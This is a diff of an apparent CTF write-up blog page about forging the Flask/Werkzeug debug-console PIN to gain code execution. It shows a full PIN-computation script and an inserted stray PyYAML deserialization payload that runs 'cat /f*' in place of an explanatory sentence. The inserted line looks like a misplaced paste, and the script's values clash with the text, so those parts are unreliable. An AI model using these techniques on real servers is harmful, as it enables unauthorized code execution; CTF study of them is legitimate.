@@ -36,7 +36,7 @@
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250816144835247.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250816144917580.png">
 <meta property="article:published_time" content="2025-08-19T11:07:05.000Z">
-<meta property="article:modified_time" content="2025-08-23T02:48:18.553Z">
+<meta property="article:modified_time" content="2025-09-15T00:59:41.788Z">
 <meta property="article:author" content="xiaolaisec">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="JAVA">
@@ -362,7 +362,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -370,7 +370,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">20</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -424,8 +424,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-08-23 10:48:18</span>
-            <span class="mobile">2025-08-23 10:48:18</span>
+            <span class="desktop">2025-09-15 08:59:41</span>
+            <span class="mobile">2025-09-15 08:59:41</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -558,7 +558,7 @@
                 ></p>
 <p><code>你是不是想说为什么不直接读flag，我也想啊，可惜dockerfile将flag文件改成了随机命名，也就是说你根本不知道flag文件名是啥，说实话，如果能直接读flag那这题也没有啥意义了(bushi</code></p>
 <p>直接访问&#x2F;console返回400(前面的图)，需要求pin后伪造cookie来RCE</p>
-<p>看dokerfile得知用户名是nobody，file_path为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.11&#x2F;site-packages&#x2F;flask&#x2F;app.py</p>
+<p>xxxxxxxxxx !!python&#x2F;object&#x2F;apply:subprocess.check_output            - !!python&#x2F;tuple              - “cat”              - “&#x2F;f*” css</p>
 <p>其他文件正常读即可</p>
 <p>算出pin码</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可能是公开的信息部分</span></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># moddir，报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 私有信息部分</span></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377568585&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address 十进制</span></span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce898ba65fb61b89725c91a48c418b81bf98bd269b6f97002c3d8f69da8594d2d2&#x27;</span></span><br><span class="line">    <span class="comment"># machine-id部分</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建哈希对象</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代可能公开和私有的信息进行哈希计算</span></span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加盐处理</span></span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 cookie 名称</span></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"><span class="built_in">print</span>(cookie_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 pin 码</span></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化 pin 码</span></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure></div>
@@ -606,7 +606,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-08-23 10:48:18
+                    :</strong> 2025-09-15 08:59:41
             </li>
         
         <li>
